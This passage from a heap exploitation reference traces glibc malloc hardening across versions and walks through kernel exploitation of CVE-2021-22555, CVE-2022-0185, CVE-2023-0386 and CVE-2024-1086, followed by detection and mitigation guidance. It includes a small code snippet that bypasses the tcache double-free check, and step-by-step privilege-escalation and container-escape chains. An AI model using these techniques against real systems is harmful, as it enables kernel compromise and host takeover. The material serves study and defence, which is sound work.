glibc 2.27 added the `key` field to `tcache_entry`, occupying the same offset as the `bk` field in a `malloc_chunk` (offset +0x08 from the user data pointer). On `tcache_put`, the `key` field is set to a pointer to the thread's `tcache_perthread_struct`. On `tcache_put`, if `entry->key == tcache`, the allocator scans the entire tcache bin for the chunk and aborts if found, detecting double-frees into the same tcache bin.

This detection was immediately bypassable by overwriting the `key` field. A UAF write that corrupts even a single byte at offset +0x08 of the freed chunk causes `entry->key != tcache`, skipping the entire check. Because the `key` value was the `tcache_perthread_struct` pointer (a heap address), an attacker with a partial overwrite capability could simply flip one byte to bypass detection. Furthermore, the tcache key was predictable: leaking a single freed chunk's `key` field revealed the `tcache_perthread_struct` address, which itself disclosed the heap base.

```c
/* glibc 2.27 double-free detection in tcache_put */
static void tcache_put(mchunkptr chunk, size_t tc_idx) {
    tcache_entry *e = (tcache_entry *)chunk2mem(chunk);
    if (__glibc_unlikely(e->key == tcache)) {
        /* Walk the entire bin looking for this chunk */
        tcache_entry *tmp;
        for (tmp = tcache->entries[tc_idx]; tmp; tmp = tmp->next)
            if (tmp == e)
                malloc_printerr("free(): double free detected in tcache 2");
    }
    e->next = tcache->entries[tc_idx];
    e->key = tcache;  /* mark as in-tcache */
    tcache->entries[tc_idx] = e;
    ++(tcache->counts[tc_idx]);
}
```

For attackers, the bypass was straightforward:

```c
/* Bypass tcache double-free check (glibc 2.27) */
free(chunk_a);
/* UAF write: corrupt the key field (offset +0x08 from user data) */
*(size_t *)((char *)chunk_a + 8) = 0;  /* any value != tcache_perthread_struct */
free(chunk_a);  /* double-free succeeds — key check skipped */
```

### 10.3 glibc 2.28–2.29 (August 2018 – January 2019) — unsorted bin and top chunk hardening

glibc 2.28 introduced incremental improvements to unsorted bin processing. glibc 2.29 was the more significant release, adding three critical checks.

First, the unsorted bin backward-link consistency check. When `_int_malloc` processes an unsorted bin chunk, it now validates `bck->fd == victim` before performing the `unsorted_chunks(av)->bk = bck` operation. This killed the classic unsorted bin attack (§5.5) outright: the attacker could no longer write a libc address to an arbitrary location by corrupting a single `bk` pointer. The entire class of techniques that chained unsorted bin attack into `_IO_list_all` overwrites (including the original House of Orange endgame) ceased to work.

Second, the top chunk size validation. Before carving from the top chunk, `_int_malloc` now validates that the top chunk's size does not exceed `av->system_mem`. This killed House of Force (§5.1): corrupting the top chunk size to `(size_t)-1` triggers an assertion failure instead of advancing the top pointer.

Third, strengthened tcache double-free detection. The `key` field check was refined, though the fundamental bypass (corrupting the `key` field) remained viable until glibc 2.34's random key.

The combined effect of these changes was the first major forced evolution of the exploitation landscape. Attackers migrated from unsorted-bin-based arbitrary-write chains to tcache-based and largebin-based techniques. The "House of Botcake" technique emerged as a response, combining tcache and unsorted-bin interactions: free a chunk into tcache, then trigger `malloc_consolidate` to merge it into a larger free chunk in the unsorted bin, creating an overlapping allocation without needing the unsorted bin attack write.

```c
/* glibc 2.29 — unsorted bin backward-link check */
bck = victim->bk;
if (__glibc_unlikely(bck->fd != victim)) {
    malloc_printerr("corrupted unsorted chunks 2");
}
unsorted_chunks(av)->bk = bck;
bck->fd = unsorted_chunks(av);
```

### 10.4 glibc 2.30 (August 2019) — fastbin and stashing checks

glibc 2.30 improved integrity checks in two areas. The tcache stashing unlink path (§6.3) received a consistency check: `bck->fd != tc_victim` now triggers an abort during the small-bin-to-tcache stashing loop, preventing the arbitrary-write primitive that tcache stashing unlink provided.

Largebin insertion also received additional validation on the `bk_nextsize` pointer, constraining the largebin attack. The checks verify that the linked list structure is consistent before inserting a new chunk, detecting corrupted `bk_nextsize` values that would cause writes to arbitrary addresses.

### 10.5 glibc 2.32 (August 2020) — safe-linking

Safe-linking was the most architecturally significant hardening change since safe unlink in glibc 2.3. The `PROTECT_PTR` / `REVEAL_PTR` macros XOR singly-linked freelist pointers (tcache `next` and fastbin `fd`) with a value derived from the pointer's storage address (see §9.2 for the full mechanism).

Safe-linking also introduced an alignment check: when a chunk is returned from tcache or fastbin, the allocator verifies that the user-data pointer is properly aligned (`aligned_OK(e)`). This prevents the classic "0x7f trick" used in fastbin attacks, where attackers targeted misaligned addresses near `__malloc_hook` to find a naturally occurring size-field-like value.

The exploitation impact was substantial. Every technique that relied on corrupting a `next` or `fd` pointer now required a heap address leak to compute the XOR key. Tcache poisoning went from requiring one write to requiring one write plus one leak. The first-entry-in-bin information disclosure (the encoded NULL revealing the page address) meant a heap info leak was often achievable, but the additional step raised reliability requirements and increased exploit complexity.

```c
/* glibc 2.32 — safe-linking enforcement in tcache_get */
static void *tcache_get(size_t tc_idx) {
    tcache_entry *e = tcache->entries[tc_idx];
    tcache->entries[tc_idx] = REVEAL_PTR(e->next);
    --(tcache->counts[tc_idx]);
    e->key = 0;
    /* Alignment check — new in 2.32 */
    if (__glibc_unlikely(!aligned_OK(e)))
        malloc_printerr("malloc(): unaligned tcache chunk detected");
    return (void *)e;
}
```

### 10.6 glibc 2.34 (August 2021) — hook removal and random tcache key

glibc 2.34 removed `__malloc_hook`, `__free_hook`, and `__realloc_hook` entirely from the public API and the internal implementation. These writable function pointers in libc's `.data` segment had been the single most popular exploitation target since the early days of heap exploitation. Any arbitrary write primitive could overwrite `__malloc_hook` with a one-gadget address; the next `malloc` call would execute the attacker's code. Their removal forced a fundamental shift in exploitation strategy.

The `tcache_key` was changed from the `tcache_perthread_struct` pointer to a per-thread random value generated at thread initialization. This made the key unpredictable without a separate info leak targeting the freed chunk's `key` field specifically. The bypass remained: leaking the `key` value (8 bytes at offset +0x08 of any freed tcache entry) or corrupting it to any non-matching value. But the change eliminated the information bonus where the old `key` value simultaneously leaked the `tcache_perthread_struct` address.

Post-hook-removal exploitation targets include: the `__exit_funcs` chain (exit handlers called during `exit()`), the `_IO_FILE` vtable chain via FSOP (§13.1), TLS-stored function pointers (§13.3), and GOT entries where RELRO is partial.

### 10.7 glibc 2.35–2.36 (February 2022 – August 2022) — continued hardening

glibc 2.35 further strengthened `_IO_FILE` operations by adding validation to the wide-data vtable path. The `_IO_wfile_overflow` and related wide-character stream operations now validate that their vtables fall within the `__libc_IO_vtables` section, closing a bypass technique (the "House of Apple" primitive relies on wide-data vtable redirection, and glibc 2.35 made the original variant harder).

Additional fastbin and tcache pointer-mangling consistency checks were added. The allocator now validates that decoded pointers (after `REVEAL_PTR`) are non-null when expected and that the resulting addresses fall within plausible memory ranges.

glibc 2.36 continued incremental hardening of heap consistency checks. The `_int_free` consolidation path received additional validation that coalesced chunk sizes do not exceed the arena's `system_mem`, preventing techniques that relied on creating impossibly large coalesced chunks through metadata corruption.

### 10.8 glibc 2.37–2.39 (February 2023 – January 2024) — incremental tightening

glibc 2.37 through 2.39 continued the pattern of incremental hardening. Enhanced pointer alignment checks were added to additional code paths. The `malloc_consolidate` function received stricter validation of fastbin chunk sizes before coalescing, preventing corrupted fastbin entries from creating invalid coalesced chunks.

In glibc 2.38, additional assertions were added to the `_int_realloc` path, validating chunk sizes and boundaries during reallocation. This closed a class of bugs where a corrupted size field could cause `realloc` to copy more data than the original allocation contained, producing an information disclosure.

glibc 2.39 added further heap consistency validation during `_int_free`'s forward-coalescing path, checking that the chunk being coalesced has a consistent `prev_size` in the next neighbor's header. This tightened the constraints on House of Einherjar-style techniques that rely on forged `prev_size` values.

### 10.8.1 Distribution version mapping

Because most exploitation targets run distribution-provided glibc packages (not upstream releases), the mapping between distribution versions and glibc versions is critical for exploit development and detection. The following table covers major LTS distributions as of 2025.

```
Distribution               glibc Version   Key Exploitation Implications
─────────────────────────  ──────────────  ──────────────────────────────────────
Ubuntu 18.04 LTS (bionic)  2.27            No safe-linking, pointer-based tcache
                                            key, hooks present. Most techniques
                                            work with minimal constraints.

Ubuntu 20.04 LTS (focal)   2.31            Pre-safe-linking, but has unsorted bin
                                            checks (2.29) and stashing checks
                                            (2.30). Hooks still present.

Ubuntu 22.04 LTS (jammy)   2.35            Safe-linking active, hooks removed,
                                            random tcache key. FSOP and exit_funcs
                                            are primary code-exec targets.

Ubuntu 24.04 LTS (noble)   2.39            Latest hardening. All classic techniques
                                            require multiple leak primitives.

Debian 11 (bullseye)       2.31            Same as Ubuntu 20.04 implications.
Debian 12 (bookworm)       2.36            Same as Ubuntu 22.04 implications.

RHEL 8 / CentOS Stream 8  2.28            Pre-unsorted-bin hardening (2.29).
                                            House of Force and unsorted bin attack
                                            may work depending on patch backports.

RHEL 9 / CentOS Stream 9  2.34            Hooks removed, safe-linking active.

Fedora 40                  2.39            Latest hardening.

Alpine 3.19 (musl libc)   N/A (musl)      Completely different allocator; ptmalloc2
                                            techniques do not apply. musl uses a
                                            simple bump allocator with mmap.
```

Note that distributions may backport specific security patches without bumping the glibc version number. RHEL in particular is known for carrying extensive backports within a nominally older glibc version. The `rpm -q glibc` or `dpkg -l libc6` output shows the distribution package version, which can be cross-referenced with the distribution's changelog to determine which upstream patches are included.

### 10.9 Determining glibc version in exploitation scenarios

When developing or analyzing an exploit, determining the target's glibc version is a critical first step. The glibc version dictates which integrity checks are present and which techniques are viable.

From a binary or core dump, the most reliable method is examining the ELF version information in the libc shared object. The `gnu_get_libc_version()` function returns the version string, and the `__libc_version` symbol in libc's `.rodata` contains it:

```bash
# From a live system
ldd --version
# From a binary's dynamic linker
strings /lib/x86_64-linux-gnu/libc.so.6 | grep "GNU C Library"
# From GDB
(gdb) p (char *)gnu_get_libc_version()
# Version encoded in the symbol table
readelf -V /lib/x86_64-linux-gnu/libc.so.6 | grep GLIBC_
```

From a remote exploitation perspective (no filesystem access), the attacker can infer the glibc version from behavior. If safe-linking is active, a leaked tcache `next` pointer for a single-entry bin will be non-zero (the encoded NULL). If the tcache `key` field contains a heap-like address, the glibc is pre-2.34 (pointer-based key). If `__malloc_hook` exists at its known offset in libc, the glibc is pre-2.34. If the unsorted bin attack works (writing a libc address to a controlled location), the glibc is pre-2.29.

### 10.10 Technique compatibility matrix by glibc version

The following table cross-references major exploitation techniques against specific glibc version ranges, indicating viability status. "Works" means the technique functions as originally described. "Needs leak" means the technique requires an additional info leak (typically a heap address). "Dead" means the technique is blocked by an integrity check that cannot be bypassed through the technique itself.

```
Technique               2.26    2.27    2.29    2.30    2.32    2.34    2.35+
────────────────────    ─────   ─────   ─────   ─────   ─────   ─────   ─────
Tcache poisoning        Works   Works   Works   Works   Needs   Needs   Needs
                                                        leak    leak    leak
Tcache dup              Works   Dead*   Dead*   Dead*   Dead*   Dead**  Dead**
  (* bypass via key)    Works   Works   Works   Works   Works   Needs   Needs
                                                        leak    leak    leak
Fastbin dup             Works   Works   Works   Works   Needs   Needs   Needs
                                                        leak    leak    leak
House of Force          Works   Works   Dead    Dead    Dead    Dead    Dead
Unsorted bin attack     Works   Works   Dead    Dead    Dead    Dead    Dead
House of Orange (orig)  Works   Works   Dead    Dead    Dead    Dead    Dead
Tcache stash unlink     N/A     Works   Works   Dead    Dead    Dead    Dead
Largebin attack         Works   Works   Works   Partial Partial Partial Partial
House of Einherjar      Works   Works   Works   Works   Works   Works   Partial
__malloc_hook overwrite Works   Works   Works   Works   Works   Dead    Dead
FSOP (_IO_FILE)         Works   Works   Partial Partial Partial Partial Harder
```

---

## 11. Real-World CVE Exploitation Walkthroughs

Building on the overviews in §7.3, this section provides step-by-step exploitation walkthroughs for four significant heap-related CVEs. Each walkthrough covers the bug root cause, heap layout manipulation, exploitation primitives achieved, reliability analysis, detection artifacts, and MITRE ATT&CK technique mappings. These CVEs represent the evolution of heap exploitation from straightforward corruption to sophisticated cross-cache and page-level techniques.

### 11.1 CVE-2021-22555 — Netfilter heap OOB write to local privilege escalation

**Bug class:** Heap out-of-bounds write (CWE-787). **CVSS 3.1:** 7.8 (High). **Affected component:** `net/netfilter/x_tables.c`, function `xt_compat_target_from_user()`. **MITRE ATT&CK:** T1068 (Exploitation for Privilege Escalation).

The vulnerability existed in the compat (32-bit compatibility) handling of Netfilter's `IPT_SO_SET_REPLACE` setsockopt. When a 32-bit compat `xt_entry_target` structure was translated to the 64-bit native format, the `memset` call that zeroed the padding between the compat and native structure sizes wrote two bytes past the end of the allocated kernel buffer. Specifically, the compat target structure was smaller than the native structure by a padding amount, and the zero-fill of this padding extended past the slab allocation boundary.

The two-byte out-of-bounds write zeroed bytes in the adjacent slab object. In the kernel's SLUB allocator, adjacent objects within the same slab page share no guard bytes, so the write directly corrupted the next object's metadata.

**Exploitation strategy — heap feng shui with `msg_msg`:**

The exploit used the `msg_msg` kernel structure as the corruption target. `msg_msg` objects are allocated from the general-purpose `kmalloc-N` caches (the same caches used by the vulnerable `xt_entry_target` allocation), making them ideal for controlled adjacency. The exploit performed the following steps:

```
Step 1: Heap layout preparation
┌──────────────────────┬──────────────────────┐
│  xt_entry_target     │  msg_msg (victim)     │
│  (vulnerable buffer) │  ┌─────────────────┐  │
│  ...                 │  │ m_list.next      │  │
│  [0x00][0x00]────────┼──│ m_list.prev      │  │
│  (2-byte OOB write)  │  │ m_type           │  │
│                      │  │ m_ts (msg size)  │  │
│                      │  │ next (msg_msgseg)│  │
│                      │  │ security         │  │
│                      │  │ payload...       │  │
│                      │  └─────────────────┘  │
└──────────────────────┴──────────────────────┘

Step 2: Corrupt msg_msg.m_list.next (partial null overwrite)
         → achieves unlinked msg_msg with corrupted list pointer

Step 3: Use msgrcv() to read through corrupted msg_msg
         → arbitrary kernel read primitive

Step 4: Spray pipe_buffer structures
         → overwrite pipe_buffer ops pointer

Step 5: Write to modprobe_path
         → trigger modprobe_path overwrite for root
```

The `msg_msg` structure's `m_ts` field (message size) determines how many bytes `msgrcv()` copies to userspace. By corrupting `m_ts` to a value larger than the actual message, the attacker causes `msgrcv()` to read past the `msg_msg` allocation into adjacent slab objects, producing a kernel address leak. With the leak, the attacker identifies the kernel text base and the address of `modprobe_path`.

The second phase used `pipe_buffer` manipulation. `pipe_buffer` structures contain a function pointer table (`pipe_buf_operations`). By spraying `pipe_buffer` objects adjacent to a corrupted allocation and overwriting the `ops` pointer, the attacker redirected pipe operations to a controlled function table. The final step overwrote `core_pattern` or `modprobe_path` with a path to an attacker-controlled script, which the kernel executes with root privileges when triggered.

**Detection artifacts.** The `IPT_SO_SET_REPLACE` setsockopt with compat-mode translations is unusual in production workloads; monitoring for `setsockopt(SOL_IP, IPT_SO_SET_REPLACE, ...)` from unprivileged processes (using seccomp audit logs or eBPF tracepoints) is an effective detection. Kernel KASAN detects the 2-byte OOB write immediately. In crash dumps, corrupted `msg_msg.m_list` pointers (pointing outside the slab cache) are a clear indicator. The `modprobe_path` or `core_pattern` modification can be monitored via `/proc/sys/kernel/modprobe` watches.

**Reliability.** The exploit is highly reliable on kernels without KASAN or SLAB randomization. The `msg_msg` spray achieves controlled adjacency with high probability because SLUB's per-CPU partial-slab caching provides deterministic allocation order within a slab page. The technique works across kernel versions 5.4 through 5.12 with minor offset adjustments.

### 11.2 CVE-2022-0185 — fs_context integer underflow to container escape

**Bug class:** Integer underflow leading to heap overflow (CWE-190, CWE-122). **CVSS 3.1:** 8.4 (High). **Affected component:** `fs/fs_context.c`, function `legacy_parse_param()`. **MITRE ATT&CK:** T1068 (Exploitation for Privilege Escalation), T1611 (Escape to Host).

The vulnerability was an integer underflow in the handling of filesystem mount parameters. The `legacy_parse_param()` function used `snprintf` to format a parameter string into a kernel buffer. The `snprintf` return value (the number of bytes that *would have been* written if the buffer were large enough) was subtracted from the remaining buffer length without checking for underflow. When the formatted string exceeded the buffer size, `snprintf` returned a value larger than the buffer, and the subtraction `len -= ret` underflowed the unsigned `size_t` variable to a very large value. Subsequent writes into the buffer used this underflowed length as the remaining capacity, allowing a massive heap overflow.

```c
/* Simplified vulnerable code path */
static int legacy_parse_param(struct fs_context *fc,
                              struct fs_parameter *param) {
    /* ... */
    size_t len = PAGE_SIZE;  /* 4096 */
    char *buf = kmalloc(len, GFP_KERNEL);
    /* ... */
    int ret = snprintf(buf + offset, len - offset,
                       "%s=%s", param->key, param->string);
    /* BUG: ret can exceed (len - offset) */
    offset += ret;
    len -= ret;  /* INTEGER UNDERFLOW when ret > len */
    /* Subsequent writes use 'len' as capacity — effectively unlimited */
}
```

**Exploitation strategy — `msg_msg` and `msg_msgseg` heap feng shui:**

The overflowed buffer was allocated from `kmalloc-4096`. The exploit sprayed `msg_msg` objects in the same slab cache to achieve controlled adjacency. The overflow corrupted the `msg_msg` header of an adjacent message, modifying the `m_ts` field (to enable arbitrary read via `msgrcv`) and the `next` pointer (to chain into `msg_msgseg` objects at controlled addresses).

```
Heap layout after spray:

kmalloc-4096 slab page:
┌─────────────┬─────────────┬─────────────┬─────────────┐
│ vuln buffer  │ msg_msg #1  │ msg_msg #2  │ msg_msg #3  │
│ (4096 bytes) │ (4096 bytes)│ (4096 bytes)│ (4096 bytes)│
└──────┬──────┴─────────────┴─────────────┴─────────────┘
       │
       └── overflow corrupts msg_msg #1 header:
           - m_ts = 0x2000 (reads past allocation boundary)
           - next = target_addr (arbitrary read via msg_msgseg chain)
```

The arbitrary read primitive leaked the kernel text base, the slab cache layout, and the address of `modprobe_path`. The arbitrary write was achieved by corrupting a `msg_msg`'s `next` pointer to target `modprobe_path`, then using `msgsnd()` to write controlled data through the corrupted chain.

**Container escape dimension.** This vulnerability was exploitable from within a Docker container under the default seccomp profile. The `unshare(CLONE_NEWNS | CLONE_NEWUSER)` system call (permitted by default Docker seccomp) created the user namespace required to access the `fs_context` mount interface. The `fsconfig` system call (used to trigger the vulnerable code path) was also permitted. This made CVE-2022-0185 a practical container escape: an unprivileged process inside a Docker container could exploit the vulnerability to gain root on the host. The exploit chain: create user namespace → trigger `fsconfig` with crafted parameters → heap overflow → arbitrary read/write → overwrite `modprobe_path` → execute as host root.

**Detection artifacts.** Anomalous `fsconfig()` system calls with oversized parameters from containerized processes. Kernel KASAN detects the heap overflow. Monitoring for `unshare(CLONE_NEWUSER)` calls from containers (via seccomp audit or eBPF) is a strong indicator when combined with subsequent `fsconfig` calls. In crash dumps, `msg_msg` objects with `m_ts` values exceeding `DATALEN_MSG` (the maximum legitimate message size, typically 8192 - sizeof(struct msg_msg)) indicate corruption.

### 11.3 CVE-2023-0386 — OverlayFS copy-up use-after-free

**Bug class:** Use-after-free during OverlayFS file operations (CWE-416). **CVSS 3.1:** 7.8 (High). **Affected component:** `fs/overlayfs/copy_up.c`. **MITRE ATT&CK:** T1068 (Exploitation for Privilege Escalation), T1611 (Escape to Host).

The vulnerability was a race condition in OverlayFS's copy-up mechanism. When a file in the lower (read-only) layer of an OverlayFS mount is modified, the filesystem performs a "copy-up" operation, copying the file to the upper (writable) layer. The bug occurred when a FUSE (Filesystem in Userspace) filesystem was used as the lower layer. The FUSE daemon could delay responses to read requests, creating a time-of-check-to-time-of-use (TOCTOU) window during which the file's metadata (including permission and ownership information) was freed and reallocated.

The specific race was between the OverlayFS copy-up path reading the file's metadata and the FUSE daemon completing (or failing) the underlying operation. If the FUSE daemon delayed its response and the OverlayFS path continued with stale references, the metadata structure was used after it had been freed by a concurrent cleanup path.

**Exploitation strategy — FUSE-controlled timing and cross-cache spray:**

The attacker's FUSE daemon provided precise control over the timing of the race. By delaying FUSE responses at specific points, the attacker widened the race window from microseconds to arbitrary duration, making the UAF reliably triggerable.

```
Timeline of exploitation:

T0: OverlayFS copy-up begins, reads file metadata from FUSE lower layer
T1: FUSE daemon receives read request but does NOT respond (blocks)
T2: Concurrent path frees the metadata structure (UAF condition)
T3: Attacker sprays replacement objects into the freed slab slot
    (e.g., setxattr() to allocate controlled data in the same kmalloc cache)
T4: FUSE daemon responds, OverlayFS continues using stale pointer
    → accesses attacker-controlled data as metadata structure
T5: Corrupted metadata escalates to arbitrary read/write
```

The cross-cache element was important because the metadata structure was not always in the same slab cache as convenient spray objects. The attacker used slab exhaustion techniques (draining a slab cache's free objects until the allocator allocates a new slab page, then freeing the target object to create a free slot in a known slab page) combined with cross-cache spray objects that could be placed in the target slab.

**Namespace escape chain.** Like CVE-2022-0185, this vulnerability was exploitable from within a user namespace because OverlayFS mounts are permitted in user namespaces (when `CONFIG_USER_NS` is enabled and `unprivileged_userns_clone` is permitted). The attack chain created a user namespace, mounted a FUSE filesystem as the lower layer of an OverlayFS, triggered the vulnerable copy-up path with controlled timing, and escalated to host root.

**Detection artifacts.** FUSE mounts as lower layers of OverlayFS within user namespaces are unusual in production. Monitoring for this specific mount configuration via mount-event tracing (fsnotify or eBPF) is a targeted detection. The UAF manifests as KASAN `use-after-free` reports in `ovl_copy_up_*` functions. Slab object type confusion (an object allocated as one type but accessed as another) produces inconsistent field values visible in crash dump analysis.

### 11.4 CVE-2024-1086 — nf_tables double-free via verdict handling

**Bug class:** Double-free (CWE-415). **CVSS 3.1:** 7.8 (High). **Affected component:** `net/netfilter/nf_tables_api.c`, verdict initialization. **MITRE ATT&CK:** T1068 (Exploitation for Privilege Escalation).

This vulnerability was a double-free in the nf_tables subsystem's handling of verdicts. When a netfilter rule's verdict was initialized via `nft_verdict_init()`, the function could be called twice for the same verdict structure under specific error-handling code paths. The first call freed the verdict's associated chain reference, and the second call freed it again, producing a double-free in the kernel's SLUB allocator.

The double-free affected objects in the `kmalloc-192` or `kmalloc-256` caches (depending on the verdict structure size and kernel version). The SLUB allocator's freelist is singly linked, and a double-free creates a cycle in the freelist (analogous to the fastbin dup in userspace ptmalloc2, §3.1).

**Exploitation strategy — page-level heap feng shui and `pipe_buffer`:**

This CVE's exploitation was notable for its sophistication in achieving reliable exploitation across multiple kernel versions (5.14 through 6.6). The exploitation technique operated at the page level rather than the slab level, using a refined cross-cache approach.

```
Phase 1: Double-free setup
  - Create nf_tables rule with crafted verdict
  - Trigger error path that double-frees the verdict object
  - Result: SLUB freelist has a cycle (object appears twice)

Phase 2: Reclaim the doubled object
  - Allocate from the same kmalloc cache twice
  - Both allocations return the same physical memory
  - Result: two "different" kernel pointers to the same memory

Phase 3: Type confusion via cross-cache
  ┌──────────────────────────────────────────────┐
  │ Same physical page                            │
  │ ┌───────────┐  ┌───────────┐                 │
  │ │ Object A   │  │ Object B   │                │
  │ │ (msg_msg)  │  │ (pipe_buf) │ ← same memory │
  │ └───────────┘  └───────────┘                 │
  └──────────────────────────────────────────────┘
  - Free one allocation, reclaim as pipe_buffer
  - The other pointer still references the memory as msg_msg
  - Read/write through msg_msg affects pipe_buffer fields

Phase 4: pipe_buffer → arbitrary read/write
  - Corrupt pipe_buffer.ops to point to fake ops table
  - pipe operations now call attacker-controlled functions
  - Use this to read/write arbitrary kernel memory

Phase 5: Privilege escalation
  - Overwrite modprobe_path or current task's cred structure
  - Trigger execution of attacker's binary as root
```

The `pipe_buffer` primitive was particularly powerful because `pipe_buffer` objects contain both function pointers (`ops`) and data pointers (`page`). Corrupting `ops` provided code execution control; corrupting `page` provided an arbitrary-read primitive through the `pipe_read` path. The combination of `msg_msg` (for controlled data layout) and `pipe_buffer` (for function-pointer redirection) became a standard exploitation pattern for kernel double-frees in 2023–2024.

**Reliability analysis.** The exploit achieved high reliability (reported >95% success rate in lab conditions) through careful heap determinism. The page-level allocation strategy (draining the page allocator's per-CPU freelists to force allocation from the buddy allocator's deterministic path) provided consistent physical page placement. The double-free's SLUB cycle was consumed in a controlled sequence, preventing the cycle from corrupting unrelated allocations.

**Detection artifacts.** KASAN detects the double-free immediately. The nf_tables verdict manipulation requires `CAP_NET_ADMIN` (or `CAP_NET_ADMIN` in a user namespace, if user namespaces are enabled). Monitoring for rapid nf_tables rule creation and deletion from unprivileged user namespaces is a targeted detection. The `pipe_buffer` corruption manifests as kernel oops in `pipe_read` or `pipe_release` with instruction-pointer values pointing into heap data (rather than kernel text).

### 11.5 Common patterns across CVE walkthroughs

Several patterns emerge from these four CVEs that reflect the modern state of kernel heap exploitation.

First, `msg_msg` has become the universal spray primitive for kernel heap exploitation. Its variable-size allocation (controlled by the user-specified message size), its readable content (via `msgrcv`), and its writable content (via `msgsnd`) make it ideal for both heap layout control and data exfiltration. The `msg_msgseg` continuation structure extends this to chained arbitrary reads.

Second, `modprobe_path` overwrite has replaced `commit_creds(prepare_kernel_cred(0))` as the preferred privilege escalation endgame. Overwriting `modprobe_path` (a kernel global string at a known offset from the kernel base) with a path to an attacker-controlled script causes the kernel to execute that script as root when a binary with an unrecognized magic number is executed. This does not require a direct ROP chain or function-pointer hijack — only an arbitrary write to a known address.

Third, user namespaces are the common enabler for container escapes. CVE-2022-0185 used `CLONE_NEWUSER` for `fsconfig` access; CVE-2023-0386 used it for OverlayFS mounts. Restricting unprivileged user namespace creation (via `sysctl kernel.unprivileged_userns_clone=0` or the `Seccomp` filter) is the most effective mitigation against this class of container escape.

Fourth, the exploitation strategy has shifted from slab-level to page-level heap feng shui. Modern exploits drain per-CPU slab caches to force page-allocator involvement, then exploit cross-cache or cross-slab relationships at the physical page level. This is a direct response to SLUB randomization and slab isolation features in newer kernels.

### 11.6 MITRE ATT&CK mapping summary

The following table maps the CVEs discussed above to their corresponding MITRE ATT&CK techniques and sub-techniques, providing a framework for detection engineering and threat intelligence integration.

```
CVE              Primary Technique              Sub-techniques / Procedures
───────────────  ─────────────────────────────  ──────────────────────────────────────
CVE-2021-22555   T1068 Exploitation for         Netfilter setsockopt heap OOB →
                 Privilege Escalation            msg_msg spray → modprobe_path write

CVE-2022-0185   T1068 Exploitation for         fs_context integer underflow →
                 Privilege Escalation            heap overflow → msg_msg arb R/W
                 T1611 Escape to Host            User namespace → fsconfig() →
                                                 container escape to host root

CVE-2023-0386   T1068 Exploitation for         OverlayFS FUSE race → cross-cache
                 Privilege Escalation            UAF → namespace escape
                 T1611 Escape to Host            User namespace OverlayFS mount

CVE-2024-1086   T1068 Exploitation for         nf_tables double-free → SLUB cycle →
                 Privilege Escalation            pipe_buffer hijack → modprobe_path

Common across all:
  T1059.004 Command and Scripting Interpreter: Unix Shell
    (modprobe_path triggers shell execution as root)
  T1055 Process Injection
    (heap-based code execution within victim process)
  T1014 Rootkit
    (post-exploitation persistence via modified modprobe_path)
```

For detection teams, the pre-exploitation indicators (unusual `setsockopt` calls, `fsconfig` from containers, FUSE-backed OverlayFS mounts, rapid nf_tables rule manipulation) are more actionable than the post-exploitation artifacts, because the heap corruption itself typically does not generate observable events. The privilege escalation step (executing the modprobe_path script or modifying creds) produces system-level artifacts (new root processes, modified kernel parameters) that can be detected by endpoint agents and auditd rules.

### 11.7 Defensive takeaways for kernel heap CVEs

Several concrete defensive measures reduce the attack surface for the classes of vulnerabilities described in this section.

First, restricting unprivileged user namespace creation via `sysctl kernel.unprivileged_userns_clone=0` or compile-time `CONFIG_USER_NS_UNPRIVILEGED=n` eliminates the namespace-based attack vectors used by CVE-2022-0185 and CVE-2023-0386. Distributions that require user namespaces for container runtime functionality (e.g., rootless Podman) should use seccomp profiles that restrict the syscalls reachable from within the namespace.

Second, enabling KASAN (Kernel Address Sanitizer) in testing and KFENCE (kernel GWP-ASan) in production provides detection coverage for the corruption primitives underlying all four CVEs. KFENCE's overhead is negligible (~1% CPU), making it suitable for production deployment on server workloads.

Third, enabling `CONFIG_SLAB_FREELIST_HARDENED` and `CONFIG_SLAB_FREELIST_RANDOM` in the kernel build raises the bar for SLUB freelist manipulation. The freelist hardening XOR-encodes freelist pointers (similar to glibc safe-linking), and freelist randomization makes object placement within a slab less predictable.

Fourth, write-protecting `modprobe_path` and `core_pattern` via kernel lockdown (`CONFIG_LOCK_DOWN_KERNEL`) or SELinux/AppArmor policies prevents the most common post-exploitation escalation path. On systems where lockdown is not feasible, monitoring these paths for modification via inotify or eBPF provides detection.

---

## 12. Heap Exploitation Detection and Forensics

§7.5 introduced the core detection mechanisms — ASan for development, heap canaries for runtime, and MTE for hardware-assisted production detection. This section provides the operational detail that detection engineers, forensic analysts, and SOC teams need: how to interpret detection tool output, how to reconstruct heap state from crash dumps, and how to build detection rules for heap exploitation indicators.

### 12.1 Runtime detection mechanisms in depth

**GWP-ASan (Google-Wide Performance-safe ASan).** GWP-ASan is a sampling-based heap error detector designed for production deployment. Unlike full ASan (which instruments every allocation), GWP-ASan intercepts a configurable fraction of allocations (typically 1 in 1000 to 1 in 10000) and serves them from a dedicated guarded pool. Each guarded allocation is placed on its own page with guard pages on both sides. When the sampled allocation is freed, the page is decommitted (`mprotect(PROT_NONE)`), causing any subsequent access through a dangling pointer to trigger a SIGSEGV.

GWP-ASan detects UAF, double-free, and buffer overflow for sampled allocations. The detection is probabilistic — only sampled allocations are protected. The overhead is minimal (typically <1% CPU, minimal memory for the guard pool). Chrome has deployed GWP-ASan in production since 2019, and Android includes it in `libc` since Android 11. Kernel GWP-ASan (KFENCE) applies the same principle to kernel allocations.

```
GWP-ASan error report (Chrome crash dump):
------------------------------------------
Use-after-free at address 0x7f2a1c003040
  Allocation:
    Thread 7 at:
      #0 malloc
      #1 blink::DOMNode::Create()  [dom_node.cc:142]
  Deallocation:
    Thread 7 at:
      #0 free
      #1 blink::DOMNode::~DOMNode()  [dom_node.cc:87]
  Access:
    Thread 12 at:
      #0 blink::DOMNode::parentNode()  [dom_node.cc:203]
```

**AddressSanitizer (ASan) heap detection internals.** ASan uses shadow memory to track the state of every byte of application memory. Each 8-byte aligned group of application bytes maps to one shadow byte. The shadow byte encodes the accessibility state: `0x00` means all 8 bytes are accessible; `0x01`–`0x07` means only the first N bytes are accessible (partial); `0xFA` means heap left redzone; `0xFD` means freed heap memory; `0xFE` means heap right redzone.

When a heap allocation is freed, ASan poisons the entire allocation's shadow memory with `0xFD` and places the chunk in a quarantine (a FIFO queue that delays reuse). The quarantine ensures that the freed memory is not immediately reused, extending the detection window for UAF bugs. The quarantine size is configurable (`ASAN_OPTIONS=quarantine_size_mb=256`).

